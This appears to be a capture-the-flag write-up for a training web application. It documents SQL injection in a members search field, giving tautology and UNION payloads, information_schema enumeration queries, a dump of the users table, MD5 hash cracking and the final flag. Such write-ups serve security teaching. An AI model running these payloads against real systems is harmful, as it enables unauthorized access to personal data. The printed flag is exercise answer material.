# SQL Injection in Members Search Vulnerability Report

## What I Found

This breach is due to SQL injection vulnerability in the search for members input. I was able to navigate through the database and get the database tables and columns.

## Step-by-Step Process

### 1. Initial Discovery
After that, I was able to get my hands on the users datatable columns. With that, I was first able to get all the users' first name and surname using `1 or 1=1`.

So the query will end up being like this:
```sql
SELECT first_name, last_name FROM users WHERE id = 1 or 1=1
```

`1 = 1` will resolve to true, after that the query response will get us all the users' first_name and last_name.

### 2. First Results
After that, I was still not able to get any flag. The response was just:
```
|ID: 1 or 1=1
First name: one
Surname : me
ID: 1 or 1=1
First name: two
Surname : me
ID: 1 or 1=1
First name: three
Surname : me
ID: 1 or 1=1
First name: Flag
Surname : GetThe|
```

Here we can notice that there is a user with the first name as "Flag" and surname as "GetThe".

### 3. Union Attack
After that, I was able to use a union operation to retrieve all the users' columns values using this query:
```sql
1 or 1=1 union select 1, CONCAT(user_id, 0x20, first_name, 0x20, last_name, 0x20, town, 0x20, country, 0x20, planet, 0x20, Commentaire, 0x20, countersign) from users
```

With that, I was able to access the user with id 5 data. It was:
```
user_id: 5
first_name: Flag
last_name: GetThe
town: 42
country: 42
planet: 42 Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Commentaire: (empty)
countersign: 5ff9d0165b4f92b14994e5c685cdce28
```

### 4. Final Steps
I was not able to make sense of this data at first, but what I ended up doing is:

1. Decode `5ff9d0165b4f92b14994e5c685cdce28` (it's the hash of the word "FortyTwo" using MD5 hashing algorithm)
2. Convert the word to all lowercase characters: FortyTwo → fortytwo
3. Hash "fortytwo" using SHA-256 hashing algorithm

So I ended up with `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5` as the flag.

## SQL Queries Used

```sql
-- Retrieve the database tables names
1 union SELECT table_name, table_name FROM information_schema.tables

-- Retrieve the database tables columns names  
1 UNION select table_name, column_name FROM information_schema.columns

-- Retrieve all the data from the users datatable
1 or 1=1 union select 1, CONCAT(user_id, 0x20, first_name, 0x20, last_name, 0x20, town, 0x20, country, 0x20, planet, 0x20, Commentaire, 0x20, countersign) from users
```